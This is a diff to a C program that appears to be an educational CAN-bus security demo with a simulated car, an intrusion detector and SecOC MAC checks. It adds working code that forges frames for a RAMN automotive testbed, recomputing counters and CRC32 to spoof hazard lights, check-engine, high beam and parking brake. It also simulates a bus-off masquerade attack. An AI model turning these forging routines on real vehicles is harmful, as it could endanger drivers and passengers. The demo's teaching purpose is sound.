@@ -65,6 +65,85 @@ static uint32_t rnd(void) {
 static float rndf(void) { return (rnd() & 0xFFFFFF) / (float)0x1000000; }
 static float gauss(void) { return (rndf() + rndf() + rndf() + rndf() - 2.0f) * 1.7f; }
 
+// ------------------------------------------- CRC32 (same as RAMN firmware)
+// RAMN default traffic: [signal 16b BE][freshness counter 16b BE][CRC32 of bytes 0-3, little-endian]
+static uint32_t crc32_buf(const uint8_t *p, int n) {
+    uint32_t crc = 0xFFFFFFFFu;
+    while (n--) {
+        crc ^= *p++;
+        for (int k = 0; k < 8; k++) crc = (crc >> 1) ^ (0xEDB88320u & (0u - (crc & 1u)));
+    }
+    return ~crc;
+}
+
+// ------------------------------------------- SipHash-2-4 (SecOC MAC demo)
+#define ROTL64(x, b) (uint64_t)(((x) << (b)) | ((x) >> (64 - (b))))
+#define SIPROUND do { v0 += v1; v1 = ROTL64(v1, 13); v1 ^= v0; v0 = ROTL64(v0, 32); v2 += v3; v3 = ROTL64(v3, 16); v3 ^= v2; \
+    v0 += v3; v3 = ROTL64(v3, 21); v3 ^= v0; v2 += v1; v1 = ROTL64(v1, 17); v1 ^= v2; v2 = ROTL64(v2, 32); } while (0)
+static uint64_t rd64(const uint8_t *p) { uint64_t v = 0; for (int i = 7; i >= 0; i--) v = (v << 8) | p[i]; return v; }
+static uint64_t siphash24(const uint8_t *in, int inlen, const uint8_t key[16]) {
+    uint64_t k0 = rd64(key), k1 = rd64(key + 8);
+    uint64_t v0 = 0x736f6d6570736575ULL ^ k0, v1 = 0x646f72616e646f6dULL ^ k1;
+    uint64_t v2 = 0x6c7967656e657261ULL ^ k0, v3 = 0x7465646279746573ULL ^ k1;
+    uint64_t b = ((uint64_t)inlen) << 56;
+    int left = inlen & 7, end = inlen - left;
+    for (int i = 0; i < end; i += 8) { uint64_t m = rd64(in + i); v3 ^= m; SIPROUND; SIPROUND; v0 ^= m; }
+    for (int i = 0; i < left; i++) b |= ((uint64_t)in[end + i]) << (8 * i);
+    v3 ^= b; SIPROUND; SIPROUND; v0 ^= b;
+    v2 ^= 0xff; SIPROUND; SIPROUND; SIPROUND; SIPROUND;
+    return v0 ^ v1 ^ v2 ^ v3;
+}
+// Secret key shared by the speed ECU and the cluster ECU only (the attacker does not have it).
+static const uint8_t SECOC_KEY[16] = {0x4b, 0x1d, 0x9e, 0x37, 0xc2, 0x58, 0xa1, 0x0f, 0x6e, 0x93, 0x24, 0xd7, 0x7a, 0x05, 0xbc, 0xe8};
+static uint32_t secoc_mac(uint32_t id, const uint8_t *d) {
+    uint8_t m[6] = {(uint8_t)(id >> 8), (uint8_t)id, d[0], d[1], d[2], d[3]};  // id + signal + freshness + checksum
+    return (uint32_t)siphash24(m, 6, SECOC_KEY);
+}
+
+// ------------------------------------------- RAMN (Toyota) signal table
+// From ToyotaInfoTech/RAMN firmware: ramn_signal_defs.h / ramn_vehicle_specific.h / ramn_actuators.h
+#define R_CMD_BRAKE 0x01A
+#define R_CTL_BRAKE 0x024
+#define R_CMD_ACCEL 0x02F
+#define R_CTL_ACCEL 0x039
+#define R_STATUS_RPM 0x043
+#define R_CMD_STEER 0x058
+#define R_CTL_STEER 0x062
+#define R_CMD_SHIFT 0x06D
+#define R_CTL_SHIFT 0x077
+#define R_CMD_HORN 0x098
+#define R_CTL_HORN 0x0A2
+#define R_CMD_LIGHTS 0x150
+#define R_CMD_TURN 0x1A7
+#define R_CTL_KEY 0x1B8
+#define R_CTL_LIGHTS 0x1BB
+#define R_CMD_PBRAKE 0x1C9
+#define R_CTL_PBRAKE 0x1D3
+static const char *ramn_name(uint32_t id) {
+    switch (id) {
+        case R_CMD_BRAKE: return "cmd brake (A)";
+        case R_CTL_BRAKE: return "brake pedal (C)";
+        case R_CMD_ACCEL: return "cmd accel (A)";
+        case R_CTL_ACCEL: return "accel pedal (C)";
+        case R_STATUS_RPM: return "rpm status (A)";
+        case R_CMD_STEER: return "cmd steer (A)";
+        case R_CTL_STEER: return "steering (B)";
+        case R_CMD_SHIFT: return "cmd shift (A)";
+        case R_CTL_SHIFT: return "gear+joy (C)";
+        case R_CMD_HORN: return "horn btn (C)";
+        case R_CTL_HORN: return "horn ctl (A)";
+        case R_CMD_LIGHTS: return "light switch (B)";
+        case R_CMD_TURN: return "turn signal (C)";
+        case R_CTL_KEY: return "engine key (D)";
+        case R_CTL_LIGHTS: return "LED state (D)";
+        case R_CMD_PBRAKE: return "cmd p-brake (A)";
+        case R_CTL_PBRAKE: return "park brake (B)";
+        case 0x7E0: case 0x7E1: case 0x7E2: case 0x7E3: return "UDS request";
+        case 0x7E8: case 0x7E9: case 0x7EA: case 0x7EB: return "UDS response";
+    }
+    return "";
+}
+
 // ---------------------------------------------------------- rate buckets
 // 10 x 100 ms buckets -> frames per second over the last ~1 s
 typedef struct {
@@ -101,9 +180,23 @@ typedef struct {
     double first, last;
     Rate rate;
     int base;  // IDS baseline Hz, -1 = unknown
+    // RAMN framing checks (real bus)
+    uint16_t ctr_last;
+    bool ctr_have;
+    uint32_t crc_ok, crc_bad;
+    Rate ctr_err, crc_err;
 } IdInfo;
 
 static IdInfo ids[MAXIDS];
+// story mode (sim): attack level 1 naive, 2 forged counter+checksum, 3 bus-off masquerade; SecOC defense
+static int atk_level = 1;
+static bool secoc_on;
+static float spd_acc;          // speed accepted by the cluster ECU (after SecOC check)
+static double spd_acc_t = -10;
+static Rate mac_fail;
+static uint32_t mac_fail_total;
+// real bus
+static bool ramn_mode;
 static int nids;
 static Rate rx_rate, ctr_rate;
 static int ctr_last = -1;
@@ -124,6 +217,7 @@ static void bus_reset(void) {
     ctr_last = -1;
 }
 
+static bool src_is_sim(void);
 static void ingest(const CanFrame *f, double t) {
     IdInfo *e = find_id(f->id);
     if (!e) {
@@ -148,10 +242,38 @@ static void ingest(const CanFrame *f, double t) {
     e->last = t;
     rate_add(&e->rate, t);
     rate_add(&rx_rate, t);
-    if (f->id == ID_SPEED && len >= 3) {
+    if (src_is_sim() && f->id == ID_SPEED && len >= 3) {
         int c = f->data[2] & 0x0F;
         if (ctr_last >= 0 && c != ((ctr_last + 1) & 0x0F)) rate_add(&ctr_rate, t);
         ctr_last = c;
+        // the cluster ECU (receiver): with SecOC it only accepts frames carrying a valid MAC
+        bool ok = true;
+        if (secoc_on) {
+            uint32_t mac = len >= 8 ? ((uint32_t)f->data[4] << 24 | (uint32_t)f->data[5] << 16 | (uint32_t)f->data[6] << 8 | f->data[7]) : 0;
+            ok = len >= 8 && mac == secoc_mac(f->id, f->data);
+        }
+        if (ok) {
+            spd_acc = ((f->data[0] << 8) | f->data[1]) / 100.0f;
+            spd_acc_t = t;
+        } else {
+            rate_add(&mac_fail, t);
+            mac_fail_total++;
+        }
+    }
+    if (!src_is_sim() && len == 8) {
+        // RAMN framing: [signal][counter BE][CRC32 LE of bytes 0-3]
+        uint32_t crc = crc32_buf(f->data, 4);
+        uint32_t got = (uint32_t)f->data[4] | (uint32_t)f->data[5] << 8 | (uint32_t)f->data[6] << 16 | (uint32_t)f->data[7] << 24;
+        if (crc == got) {
+            e->crc_ok++;
+            uint16_t c = (uint16_t)(f->data[2] << 8 | f->data[3]);
+            if (e->ctr_have && c != (uint16_t)(e->ctr_last + 1)) rate_add(&e->ctr_err, t);
+            e->ctr_last = c;
+            e->ctr_have = true;
+        } else if (e->crc_ok > 10) {
+            e->crc_bad++;
+            rate_add(&e->crc_err, t);
+        }
     }
     if (log_fp) {
         char hex[20];
@@ -170,6 +292,7 @@ enum { TAB_CLUSTER, TAB_SNIFF, TAB_IDS, TAB_NFC, TAB_IR, NTABS };
 static const char *TAB_NAMES[NTABS] = {"CLUSTER", "SNIFFER", "IDS", "NFC", "IR CAM"};
 
 static int src = SRC_SIM;
+static bool src_is_sim(void) { return src == SRC_SIM; }
 static int tab = TAB_CLUSTER;
 static bool tx_armed = true;
 static bool show_help;
@@ -249,6 +372,11 @@ static void car_frame(uint32_t id, double t, CanFrame *f) {
             int v = (int)(car.speed * 100);
             d[0] = v >> 8; d[1] = v & 255; d[2] = (uint8_t)car.ctr; d[3] = (uint8_t)(d[0] + d[1] + d[2]);
             f->len = 4;
+            if (secoc_on) {
+                uint32_t mac = secoc_mac(ID_SPEED, d);
+                d[4] = mac >> 24; d[5] = mac >> 16; d[6] = mac >> 8; d[7] = mac;
+                f->len = 8;
+            }
         } break;
         case ID_WHEELS:
             for (int i = 0; i < 4; i++) {
@@ -284,9 +412,11 @@ static void car_frame(uint32_t id, double t, CanFrame *f) {
     }
 }
 
+static bool speed_ecu_busoff;
 static void car_tick(double t, float dt) {
     car_physics(dt);
     for (int i = 0; i < 10; i++) {
+        if (SCHED_ID[i] == ID_SPEED && speed_ecu_busoff) { car.last[i] = t; continue; }
         if (t - car.last[i] > 0.5) car.last[i] = t - SCHED_P[i];
         while (t - car.last[i] >= SCHED_P[i]) {
             car.last[i] += SCHED_P[i];
@@ -298,7 +428,8 @@ static void car_tick(double t, float dt) {
 }
 
 // ---------------------------------------------------------------- attacker
-enum { ATK_SPEED, ATK_RPM, ATK_DOORS, ATK_MIL, ATK_FUZZ, ATK_OMAX, ATK_OMIN, ATK_N };
+enum { ATK_SPEED, ATK_RPM, ATK_DOORS, ATK_MIL, ATK_FUZZ, ATK_OMAX, ATK_OMIN,
+       ATK_R_HAZARD, ATK_R_CHECK, ATK_R_HIBEAM, ATK_R_PBRAKE, ATK_N };
 static bool atk_hold[ATK_N];
 static double atk_until[ATK_N];
 static double atk_acc;
@@ -319,14 +450,66 @@ static void emit_tx(const CanFrame *f, double t) {
         ingest(f, t);
         atk_sent++;
     } else if (tx_armed) {
-        if (plat_usb_send(f)) atk_sent++;
+        if (plat_usb_send(f)) {
+            atk_sent++;
+            ingest(f, t);  // we are a node on the bus: our frames are part of the traffic the IDS taps
+        }
     }
+}
+
+// Forge a RAMN frame: copy the real ECU's last frame, patch the signal, continue its freshness
+// counter and recompute the CRC32. CRC is an integrity check, not authentication: anyone can compute it.
+static void ramn_forge(uint32_t id, int off, const uint8_t *sig, int n, CanFrame *f) {
+    IdInfo *e = find_id(id);
+    memset(f, 0, sizeof(*f));
+    f->id = id;
+    f->len = 8;
+    if (e && e->len == 8) memcpy(f->data, e->data, 8);
+    memcpy(f->data + off, sig, (size_t)n);
+    uint16_t c = (e && e->ctr_have) ? (uint16_t)(e->ctr_last + 1) : 0;
+    f->data[2] = (uint8_t)(c >> 8);
+    f->data[3] = (uint8_t)c;
+    uint32_t crc = crc32_buf(f->data, 4);
+    f->data[4] = (uint8_t)crc; f->data[5] = (uint8_t)(crc >> 8); f->data[6] = (uint8_t)(crc >> 16); f->data[7] = (uint8_t)(crc >> 24);
+}
+
+// Re-sign (well, re-checksum) an existing RAMN frame: next freshness counter + fresh CRC32.
+static void ramn_fix(CanFrame *f) {
+    IdInfo *e = find_id(f->id);
+    uint16_t c = (e && e->ctr_have) ? (uint16_t)(e->ctr_last + 1) : 0;
+    f->data[2] = (uint8_t)(c >> 8);
+    f->data[3] = (uint8_t)c;
+    uint32_t crc = crc32_buf(f->data, 4);
+    f->data[4] = (uint8_t)crc; f->data[5] = (uint8_t)(crc >> 8); f->data[6] = (uint8_t)(crc >> 16); f->data[7] = (uint8_t)(crc >> 24);
 }
 
 static void atk_build(int a, CanFrame *f) {
     memset(f, 0, sizeof(*f));
     switch (a) {
-        case ATK_SPEED: f->id = ID_SPEED; f->len = 4; f->data[0] = 0x5D; f->data[1] = 0xC0; break;  // 240 km/h, ctr 0
+        case ATK_SPEED:
+            f->id = ID_SPEED; f->len = 4; f->data[0] = 0x5D; f->data[1] = 0xC0;  // 240.00 km/h
+            if (atk_level >= 2) {  // forge a valid freshness counter + checksum
+                f->data[2] = (uint8_t)((ctr_last + 1) & 0x0F);
+                f->data[3] = (uint8_t)(f->data[0] + f->data[1] + f->data[2]);
+            }
+            if (secoc_on) {  // attacker has no key: right length, garbage MAC
+                f->len = 8;
+                uint32_t g = rnd();
+                f->data[4] = g >> 24; f->data[5] = g >> 16; f->data[6] = g >> 8; f->data[7] = g;
+            }
+            break;
+        case ATK_R_HAZARD: { uint8_t v[2] = {1, 1}; ramn_forge(R_CMD_TURN, 0, v, 2, f); } break;  // byte0 right, byte1 left
+        case ATK_R_CHECK: {
+            IdInfo *e = find_id(R_CMD_LIGHTS);
+            uint8_t v[2] = {0xFF, (uint8_t)(e && e->len >= 2 ? e->data[1] : 1)};  // high byte = engine warning flags
+            ramn_forge(R_CMD_LIGHTS, 0, v, 2, f);
+        } break;
+        case ATK_R_HIBEAM: {
+            IdInfo *e = find_id(R_CMD_LIGHTS);
+            uint8_t v[2] = {(uint8_t)(e && e->len >= 1 ? e->data[0] : 0), 4};  // light switch position 4 = high beam
+            ramn_forge(R_CMD_LIGHTS, 0, v, 2, f);
+        } break;
+        case ATK_R_PBRAKE: { uint8_t v[1] = {1}; ramn_forge(R_CTL_PBRAKE, 0, v, 1, f); } break;
         case ATK_RPM: {
             static const uint8_t r[8] = {0x1E, 0x78, 100, 130, 0, 0, 0, 0};
             f->id = ID_ENGINE; f->len = 8; memcpy(f->data, r, 8);
@@ -342,7 +525,21 @@ static void atk_build(int a, CanFrame *f) {
     }
 }
 
+static double masq_acc;
 static void atk_tick(double t, float dt) {
+    bool masq = src == SRC_SIM && atk_level == 3 && atk_active(ATK_SPEED, t);
+    speed_ecu_busoff = masq;
+    if (masq) {  // bus-off'd the real speed ECU: now send at exactly its 50 Hz with a perfect counter chain
+        masq_acc += dt * 50.0;
+        int m = (int)masq_acc;
+        masq_acc -= m;
+        if (m > 4) m = 4;
+        for (int k = 0; k < m; k++) {
+            CanFrame f;
+            atk_build(ATK_SPEED, &f);
+            emit_tx(&f, t);
+        }
+    } else masq_acc = 0;
     bool any = false;
     for (int a = 0; a < ATK_N; a++) any |= atk_active(a, t);
     if (!any) { atk_acc = 0; return; }
@@ -354,8 +551,10 @@ static void atk_tick(double t, float dt) {
         for (int a = 0; a < ATK_N; a++) {
             if (!atk_active(a, t)) continue;
             if ((a == ATK_OMAX || a == ATK_OMIN) && !ovr_ok) continue;
+            if (a == ATK_SPEED && atk_level == 3) continue;  // masquerade runs on its own 50 Hz clock below
             CanFrame f;
             atk_build(a, &f);
+            if ((a == ATK_OMAX || a == ATK_OMIN) && ramn_mode && f.len == 8) ramn_fix(&f);
             emit_tx(&f, t);
         }
 }
@@ -398,6 +597,7 @@ add:
     if (sev != SEV_INFO) {
         ids_last_hit = t;
         snprintf(ids_last_msg, sizeof(ids_last_msg), "%s", txt);
+        plat_rumble(sev == SEV_CRIT ? 0.9f : 0.5f, sev == SEV_CRIT ? 220 : 120);
     }
 }
 
@@ -433,6 +633,22 @@ static void ids_eval(double t) {
     if (ce > 5) {
         snprintf(buf, sizeof(buf), "COUNTER BREAK 0x1A0: %d/s -> spoofed frames", ce);
         ids_alert(0x30000000, SEV_CRIT, buf, t);
+    }
+    int mf = rate_get(&mac_fail, t);
+    if (mf > 0) {
+        snprintf(buf, sizeof(buf), "SecOC MAC FAIL 0x1A0: forged frame rejected (%d/s)", mf);
+        ids_alert(0x40000000, SEV_CRIT, buf, t);
+    }
+    for (int i = 0; i < nids; i++) {  // real bus: RAMN freshness counter + CRC32
+        int cr = rate_get(&ids[i].ctr_err, t), kr = rate_get(&ids[i].crc_err, t);
+        if (cr > 3) {
+            snprintf(buf, sizeof(buf), "COUNTER BREAK 0x%03X: %d/s -> forged/replayed", (unsigned)ids[i].id, cr);
+            ids_alert(0x50000000 | ids[i].id, SEV_CRIT, buf, t);
+        }
+        if (kr > 2) {
+            snprintf(buf, sizeof(buf), "CRC32 FAIL 0x%03X: %d/s -> corrupted/fuzzed", (unsigned)ids[i].id, kr);
+            ids_alert(0x60000000 | ids[i].id, SEV_CRIT, buf, t);
+        }
     }
 }
 
@@ -645,6 +861,8 @@ static void stop_attract(void) {
         attract_on = false;
         atk_clear();
         car.bl = car.br = false;
+        atk_level = 1;
+        secoc_on = false;
     }
 }
 
@@ -675,6 +893,7 @@ static void press(uint32_t b, double t) {
     if ((b == B_ZR || b == B_ZL) && tab <= TAB_IDS) {
         if (src == SRC_SIM) {
             atk_hold[b == B_ZR ? ATK_SPEED : ATK_RPM] = true;
+            plat_rumble(0.3f, 50);
         } else {
             if (!can_tx(t)) return;
             if (!build_override()) { toast(t, "Pin a signal in SNIFFER first (A on a byte)"); return; }
@@ -693,7 +912,31 @@ static void press(uint32_t b, double t) {
         else if (b == B_A) pin_selected(t);
         else if (b == B_B) { memset(pins, 0, sizeof(pins)); next_slot = 0; toast(t, "Pins cleared - gauges back to default"); }
         else if (b == B_Y) fuzz_start(sel_id, have_sel, t);
+    } else if (tab == TAB_CLUSTER && src == SRC_USB && ramn_mode) {
+        int a = b == B_A ? ATK_R_HAZARD : b == B_B ? ATK_R_CHECK : b == B_Y ? ATK_R_HIBEAM : b == B_UP ? ATK_R_PBRAKE : -1;
+        if (a >= 0) {
+            if (!can_tx(t)) return;
+            atk_until[a] = t + 4.0;
+            plat_rumble(0.35f, 60);
+            static const char *nm[4] = {"HAZARD LIGHTS (0x1A7)", "CHECK ENGINE (0x150 hi)", "HIGH BEAM (0x150 lo=4)", "PARKING BRAKE (0x1D3)"};
+            toast(t, "Forging %s for 4 s - valid counter + CRC32", nm[a - ATK_R_HAZARD]);
+        }
     } else if (tab == TAB_CLUSTER) {
+        if (b == B_UP && src == SRC_SIM) {
+            atk_level = atk_level % 3 + 1;
+            static const char *lv[3] = {"L1 NAIVE: replay a fixed frame (counter 0, bad checksum)",
+                                        "L2 FORGED: valid counter + checksum, but extra frames on the bus",
+                                        "L3 MASQUERADE: bus-off the real ECU, then impersonate it perfectly"};
+            toast(t, "%s", lv[atk_level - 1]);
+            plat_rumble(0.25f, 40);
+            return;
+        }
+        if (b == B_DOWN && src == SRC_SIM) {
+            secoc_on = !secoc_on;
+            toast(t, secoc_on ? "SecOC ON: speed frames carry a 32-bit MAC (SipHash, secret key)" : "SecOC OFF: frames are only checksummed");
+            plat_rumble(0.25f, 40);
+            return;
+        }
         if (b == B_LEFT && src == SRC_SIM) { car.bl = !car.bl; car.br = false; }
         else if (b == B_RIGHT && src == SRC_SIM) { car.br = !car.br; car.bl = false; }
         else if (b == B_A) {
@@ -746,17 +989,19 @@ static void tap(int x, int y, double t) {
 
 // -------------------------------------------------------------- attract mode
 static void attract(double t) {
-    double p = fmod(t - attract_t0, 40.0);
-    car.throttle = p < 9 ? 0.85f : p < 20 ? 0.35f : p < 30 ? 0.15f : p < 36 ? 0.6f : 0.0f;
-    car.brake = p >= 36 ? 0.6f : 0.0f;
-    car.bl = p >= 9 && p < 13;
-    tab = p < 20 ? TAB_CLUSTER : p < 30 ? TAB_IDS : TAB_SNIFF;
-    atk_hold[ATK_SPEED] = (p >= 12 && p < 16) || (p >= 23 && p < 26);
-    atk_hold[ATK_RPM] = p >= 16 && p < 18;
-    atk_hold[ATK_DOORS] = p >= 18 && p < 19.5;
-    atk_hold[ATK_MIL] = p >= 19.5 && p < 21;
+    double p = fmod(t - attract_t0, 44.0);
+    car.throttle = p < 8 ? 0.85f : p < 34 ? 0.3f : p < 41 ? 0.6f : 0.0f;
+    car.brake = p >= 41 ? 0.6f : 0.0f;
+    car.bl = p >= 4 && p < 7;
+    atk_level = p < 11 ? 1 : p < 17 ? 2 : 3;
+    secoc_on = p >= 24 && p < 40;
+    tab = p < 30 ? TAB_CLUSTER : p < 35 ? TAB_IDS : TAB_SNIFF;
+    atk_hold[ATK_SPEED] = (p >= 8 && p < 11) || (p >= 12 && p < 15) || (p >= 18.5 && p < 23) || (p >= 25 && p < 32);
+    atk_hold[ATK_RPM] = false;
+    atk_hold[ATK_DOORS] = p >= 5 && p < 6;
+    atk_hold[ATK_MIL] = false;
     if (tab == TAB_SNIFF && nids) {
-        sel_id = ids[((int)(p - 30)) % nids].id;
+        sel_id = ids[((int)(p - 35)) % nids].id;
         have_sel = true;
         byte_cur = 0;
     }
@@ -781,7 +1026,7 @@ static void draw_header(double t) {
     }
     char line[96], l2[96];
     if (src == SRC_SIM) snprintf(line, sizeof(line), "SIM car  |  %s", plat_usb_label());
-    else snprintf(line, sizeof(line), "%s", plat_usb_label());
+    else snprintf(line, sizeof(line), "%s%s", ramn_mode ? "RAMN | " : "", plat_usb_label());
     if ((int)strlen(line) > 36) line[36] = 0;
     txt(&FONT_S, line, 1170, 8, src == SRC_SIM ? CYAN : GREEN, A_TR);
     const char *tx = src == SRC_SIM ? "TX: SIM" : (tx_armed ? "TX ARMED" : "TX LOCKED");
@@ -819,7 +1064,9 @@ static Sig signals(double t) {
     if ((e = find_id(ID_ENGINE)) && t - e->last < 1.0 && e->len >= 4) {
         s.rpm_ok = true; s.rpm = (e->data[0] << 8) | e->data[1]; s.thr = e->data[2]; s.cool = e->data[3] - 40;
     }
-    if ((e = find_id(ID_SPEED)) && t - e->last < 1.0 && e->len >= 2) { s.spd_ok = true; s.spd = ((e->data[0] << 8) | e->data[1]) / 100.0f; }
+    if (src == SRC_SIM) {
+        if (t - spd_acc_t < 1.0) { s.spd_ok = true; s.spd = spd_acc; }
+    } else if ((e = find_id(ID_SPEED)) && t - e->last < 1.0 && e->len >= 2) { s.spd_ok = true; s.spd = ((e->data[0] << 8) | e->data[1]) / 100.0f; }
     if ((e = find_id(ID_LIGHTS)) && t - e->last < 1.0 && e->len >= 1) { s.blink_ok = true; s.blink = e->data[0]; }
     if ((e = find_id(ID_WARN)) && t - e->last < 1.0 && e->len >= 1) { s.warn_ok = true; s.warn = e->data[0]; }
     if ((e = find_id(ID_DOORS)) && t - e->last < 1.0 && e->len >= 1) { s.doors_ok = true; s.doors = e->data[0]; }
@@ -941,12 +1188,162 @@ static void draw_cluster(double t) {
             hit_add(r, types[i], bits[i], 0);
         }
     }
-    gfx_rrect(C, 1048, 568, 214, 74, 12, PANEL);
-    snprintf(buf, sizeof(buf), "spoofed TX  %u", (unsigned)atk_sent);
-    txt(&FONT_S, buf, 1062, 580, AMBER, A_TL);
-    int ce = rate_get(&ctr_rate, t);
-    snprintf(buf, sizeof(buf), "ctr errors  %d/s", ce);
-    txt(&FONT_S, buf, 1062, 608, ce > 5 ? RED : DIM, A_TL);
+    if (src == SRC_SIM) {
+        static const char *lvn[3] = {"ATTACK L1 naive", "ATTACK L2 forged", "ATTACK L3 masq."};
+        Rect lr = {1048, 568, 214, 34}, sr2 = {1048, 608, 214, 34};
+        gfx_rrect(C, lr.x, lr.y, lr.w, lr.h, 8, PANEL2);
+        gfx_rrect_line(C, lr.x, lr.y, lr.w, lr.h, 8, 2, atk_level == 3 ? AMBER : LINE);
+        txt(&FONT_S, lvn[atk_level - 1], lr.x + 10, lr.y + 8, atk_level == 3 ? AMBER : FG, A_TL);
+        txt(&FONT_XS, "[Up]", lr.x + lr.w - 8, lr.y + 10, DIM, A_TR);
+        hit_add(lr, HT_TAP, B_UP, 0);
+        gfx_rrect(C, sr2.x, sr2.y, sr2.w, sr2.h, 8, secoc_on ? COL(20, 70, 45) : PANEL2);
+        gfx_rrect_line(C, sr2.x, sr2.y, sr2.w, sr2.h, 8, 2, secoc_on ? GREEN : LINE);
+        txt(&FONT_S, secoc_on ? "SecOC ON (MAC)" : "SecOC OFF", sr2.x + 10, sr2.y + 8, secoc_on ? GREEN : DIM, A_TL);
+        txt(&FONT_XS, "[Down]", sr2.x + sr2.w - 8, sr2.y + 10, DIM, A_TR);
+        hit_add(sr2, HT_TAP, B_DOWN, 0);
+        // lesson strip (only when no intrusion banner)
+        bool hit_now = ids_on && t - ids_last_hit < 3.0;
+        bool attacking = atk_active(ATK_SPEED, t);
+        if (!hit_now && attacking) {
+            const char *msg; uint32_t col = AMBER;
+            if (secoc_on) { msg = "SecOC: forged frames have no valid MAC -> the cluster rejects them"; col = GREEN; }
+            else if (atk_level == 3) msg = "IDS BLIND: real ECU is bus-off, attacker matches rate + counter + checksum";
+            else if (atk_level == 2) msg = "Forged counter + checksum pass... but the extra frames double the rate";
+            else msg = "Naive replay: fixed frame, broken counter";
+            gfx_fill(C, 0, 516, W, 40, COL(40, 32, 10));
+            txt(&FONT_B, msg, W / 2, 536, col, A_C);
+        }
+    }
+}
+
+// ------------------------------------------------------------- RAMN dashboard
+static uint16_t ramn_u16(uint32_t id, double t, bool *ok) {
+    IdInfo *e = find_id(id);
+    *ok = e && e->len >= 2 && t - e->last < 1.5;
+    return *ok ? (uint16_t)(e->data[0] << 8 | e->data[1]) : 0;
+}
+static uint8_t ramn_u8(uint32_t id, int idx, double t, bool *ok) {
+    IdInfo *e = find_id(id);
+    *ok = e && e->len > idx && t - e->last < 1.5;
+    return *ok ? e->data[idx] : 0;
+}
+
+static void pedal_bar(int x, int y, int w, int h, const char *lab, uint32_t id, uint16_t v, bool ok, uint32_t col) {
+    char buf[32];
+    gfx_rrect(C, x, y, w, h, 10, PANEL2);
+    float f = ok ? v / 4095.0f : 0;
+    if (f > 1) f = 1;
+    int fh = (int)((h - 8) * f);
+    if (fh > 0) gfx_rrect(C, x + 4, y + h - 4 - fh, w - 8, fh, 8, col);
+    txt(&FONT_B, lab, x + w / 2, y + h + 18, FG, A_C);
+    snprintf(buf, sizeof(buf), "0x%03X", (unsigned)id);
+    txt(&FONT_XS, buf, x + w / 2, y + h + 40, DIM, A_C);
+    snprintf(buf, sizeof(buf), ok ? "%u" : "--", (unsigned)v);
+    txt(&FONT_M, buf, x + w / 2, y - 18, ok ? FG : DIM, A_C);
+}
+
+static void draw_ramn(double t) {
+    char buf[96];
+    bool ok;
+    // --- steering wheel (ECU B potentiometer, 12-bit, center 0x7FF)
+    uint16_t st = ramn_u16(R_CTL_STEER, t, &ok);
+    float ang = ok ? ((float)st - 2047.0f) / 2047.0f * 2.356f : 0;  // +-135 deg
+    static float sdisp;
+    sdisp += (ang - sdisp) * 0.5f;
+    float cx = 230, cy = 290, r = 150;
+    gfx_ring(C, cx, cy, r, r - 24, ok ? COL(70, 76, 92) : LINE);
+    gfx_circle(C, cx, cy, 34, PANEL2);
+    for (int k = 0; k < 3; k++) {
+        float a = sdisp + 1.5708f + k * 2.0944f + 3.14159f;
+        if (k == 0) a = sdisp - 1.5708f + 3.14159f;  // bottom spoke
+        if (k == 1) a = sdisp + 0.2f;
+        if (k == 2) a = sdisp + 3.14159f - 0.2f;
+        gfx_line(C, cx + cosf(a) * 30, cy + sinf(a) * 30, cx + cosf(a) * (r - 20), cy + sinf(a) * (r - 20), 16, ok ? COL(70, 76, 92) : LINE);
+    }
+    // top marker
+    float ma = sdisp - 1.5708f;
+    gfx_circle(C, cx + cosf(ma) * (r - 12), cy + sinf(ma) * (r - 12), 9, RED);
+    txt(&FONT_B, "STEERING", (int)cx, 470, FG, A_C);
+    snprintf(buf, sizeof(buf), ok ? "0x062  raw %u  (%+.0f deg)" : "0x062  --", (unsigned)st, ang * 57.3f);
+    txt(&FONT_S, buf, (int)cx, 494, DIM, A_C);
+
+    // --- center: gear, key, light switch, rpm
+    int mx = 640;
+    uint8_t gear = ramn_u8(R_CTL_SHIFT, 0, t, &ok);
+    bool gok = ok;
+    uint8_t joy = ramn_u8(R_CTL_SHIFT, 1, t, &ok);
+    txt(&FONT_S, "GEAR (0x077)", mx, 76, DIM, A_C);
+    snprintf(buf, sizeof(buf), gok ? "%u" : "-", gear);
+    txt(&FONT_HUGE, buf, mx, 150, FG, A_C);
+    static const char *jn[7] = {"?", "released", "up", "down", "right", "left", "push"};
+    snprintf(buf, sizeof(buf), "joystick: %s", ok && joy < 7 ? jn[joy] : "--");
+    txt(&FONT_S, buf, mx, 214, DIM, A_C);
+    uint8_t key = ramn_u8(R_CTL_KEY, 0, t, &ok);
+    static const char *kn[4] = {"--", "OFF", "ACC", "IGN"};
+    snprintf(buf, sizeof(buf), "KEY %s", ok && key < 4 ? kn[key] : "--");
+    gfx_rrect(C, mx - 150, 240, 140, 40, 8, ok && key == 3 ? COL(20, 70, 45) : PANEL2);
+    txt(&FONT_B, buf, mx - 80, 260, ok && key == 3 ? GREEN : FG, A_C);
+    bool lok;
+    uint16_t lights = ramn_u16(R_CMD_LIGHTS, t, &lok);
+    static const char *ln[5] = {"--", "OFF", "TAIL", "LOW", "HIGH"};
+    int lp = lights & 0xFF;
+    snprintf(buf, sizeof(buf), "LIGHTS %s", lok && lp < 5 ? ln[lp] : "--");
+    gfx_rrect(C, mx + 10, 240, 140, 40, 8, PANEL2);
+    txt(&FONT_B, buf, mx + 80, 260, FG, A_C);
+    uint16_t rpm = ramn_u16(R_STATUS_RPM, t, &ok);
+    snprintf(buf, sizeof(buf), ok ? "rpm status 0x043: %u" : "rpm status 0x043: --", (unsigned)rpm);
+    txt(&FONT_S, buf, mx, 300, DIM, A_C);
+
+    // --- LED mirror (ECU D reports its own LED state on 0x1BB = proof the attack landed)
+    uint8_t led = ramn_u8(R_CTL_LIGHTS, 0, t, &ok);
+    static const char *lname[8] = {"BATT", "CHECK", "P-BRK", "TAIL", "LOW", "HIGH", "LEFT", "RIGHT"};
+    static const uint32_t lcol[8] = {RED, AMBER, RED, COL(200, 40, 40), CYAN, COL(80, 140, 255), GREEN, GREEN};
+    txt(&FONT_S, "ECU D LEDs (0x1BB, reported by the board)", mx, 336, DIM, A_C);
+    for (int i = 0; i < 8; i++) {
+        int lx = mx - 4 * 46 + 23 + i * 46, ly = 382;
+        bool on = ok && (led >> i) & 1;
+        if (on) gfx_circle(C, (float)lx, (float)ly, 19, gfx_lerp(BG, lcol[i], 0.35f));
+        gfx_circle(C, (float)lx, (float)ly, 14, on ? lcol[i] : PANEL2);
+        txt(&FONT_XS, lname[i], lx, ly + 28, on ? FG : DIM, A_C);
+    }
+    // --- framing lesson
+    IdInfo *te = find_id(R_CTL_ACCEL);
